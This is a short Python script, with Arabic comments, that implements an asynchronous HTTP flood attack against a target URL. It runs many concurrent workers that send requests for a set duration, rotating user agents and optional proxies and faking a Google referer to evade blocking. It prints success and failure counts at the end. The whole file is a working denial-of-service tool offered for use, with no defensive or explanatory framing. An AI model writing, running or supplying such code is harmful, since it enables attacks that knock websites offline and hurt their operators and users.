import asyncio
import httpx
import random
import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
    # أضف المزيد من اليوزر أجننت حسب الحاجة
]

PROXIES = [
    # مثال على بروكسي HTTP و SOCKS5 (يمكنك تركها فارغة إذا لا تريد استخدام بروكسي)
    # "http://127.0.0.1:8080",
    # "socks5://127.0.0.1:1080",
]

def get_proxies():
    # ترجع قائمة البروكسيات أو فارغة إذا لم يكن هناك
    return PROXIES

async def send_request(target_url, proxy_url=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "https://google.com",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    async with httpx.AsyncClient(timeout=10) as client:
        if proxy_url:
            response = await client.get(target_url, headers=headers, proxies=proxy_url)
        else:
            response = await client.get(target_url, headers=headers)
    return response.status_code

async def attack_worker(target_url, duration):
    timeout = time.time() + duration
    success = 0
    failure = 0
    proxies = get_proxies()

    while time.time() < timeout:
        proxy = None
        if proxies:
            proxy_str = random.choice(proxies)
            proxy = {"http://": proxy_str, "https://": proxy_str}
        try:
            status = await send_request(target_url, proxy_url=proxy)
            print(f"[HTTP Async] Request sent via {proxy if proxy else 'direct connection'} - Status: {status}")
            success += 1
        except Exception as e:
            print(f"[HTTP Async] Request error via {proxy if proxy else 'direct connection'}: {e}")
            failure += 1

    print(f"Attack finished: Success={success}, Failure={failure}")

async def http_flood(target_url, duration, concurrency):
    tasks = []
    for _ in range(concurrency):
        tasks.append(asyncio.create_task(attack_worker(target_url, duration)))
    await asyncio.gather(*tasks)
